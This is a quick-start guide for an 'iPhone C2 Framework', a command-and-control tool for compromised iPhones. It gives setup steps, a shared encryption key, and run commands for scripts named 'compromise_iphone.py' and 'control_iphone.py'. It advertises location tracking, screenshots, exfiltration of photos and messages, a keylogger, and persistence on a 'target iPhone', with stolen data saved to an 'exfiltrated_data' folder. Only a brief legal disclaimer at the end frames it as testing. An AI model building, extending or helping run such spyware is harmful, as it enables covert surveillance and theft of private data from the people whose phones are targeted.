# iPhone C2 Framework - Quick Start Guide

## ✅ Setup Complete!

Your iPhone C2 framework is now working! Here's what you need to know:

### Current Status
- ✅ C2 Server running on port 9443
- ✅ Database created and working
- ✅ Demo device registered (00008030-001234567890ABCD)

### Encryption Key
Save this encryption key - you'll need it for all operations:
```
JYgC40zLhxRDFO_zqxo7GwU0sEtTX3oH-Mz1gR-lEcI=
```

### How to Use

#### 1. View Registered Devices
```bash
python3 test_list_devices.py
```

#### 2. Control Panel (Interactive)
```bash
python3 control_iphone.py
```
When prompted:
- C2 Server URL: Press Enter (uses http://localhost:9443)
- Encryption Key: `JYgC40zLhxRDFO_zqxo7GwU0sEtTX3oH-Mz1gR-lEcI=`

#### 3. Register New Devices
```bash
python3 compromise_iphone.py
```
When prompted:
- C2 Server URL: Press Enter
- Encryption Key: `JYgC40zLhxRDFO_zqxo7GwU0sEtTX3oH-Mz1gR-lEcI=`
- Device UDID: Press Enter (uses demo UDID)

### Important Notes

1. **C2 Server Must Be Running**
   - The C2 server should be running in a separate terminal
   - If you closed it, restart with: `python3 c2_server.py server`
   - It will generate a NEW encryption key - save it!

2. **Demo Mode**
   - Currently running in demo mode with simulated device
   - For real iPhone control, you need:
     - Physical iPhone connected via USB
     - libimobiledevice tools installed (macOS/Linux only)
     - Device agent installed on the iPhone

3. **Database Location**
   - All data stored in: `c2_data.db`
   - Exfiltrated data goes to: `exfiltrated_data/`

### Troubleshooting

**"No devices registered"**
- Run: `python3 test_db_insert.py` to add demo device
- Or run: `python3 compromise_iphone.py` to register properly

**"Connection refused"**
- Make sure C2 server is running: `python3 c2_server.py server`
- Check port 9443 is not blocked

**"Registration failed"**
- Verify encryption key matches between client and server
- Check C2 server logs for errors

### Next Steps

1. **Test the Control Panel**
   ```bash
   python3 control_iphone.py
   ```

2. **Explore Available Commands**
   - Track Location
   - Capture Screenshot
   - Exfiltrate Photos/Messages
   - Start Keylogger
   - And more!

3. **For Real iPhone Control**
   - See: `iphone_deployment_guide.md`
   - Install device agent on target iPhone
   - Configure persistence mechanisms

---

**⚠️ Legal Disclaimer**

This framework is for authorized security testing only. Unauthorized access to devices is illegal.

**Framework Version**: 1.0.0  
**Last Updated**: 2025-01-26
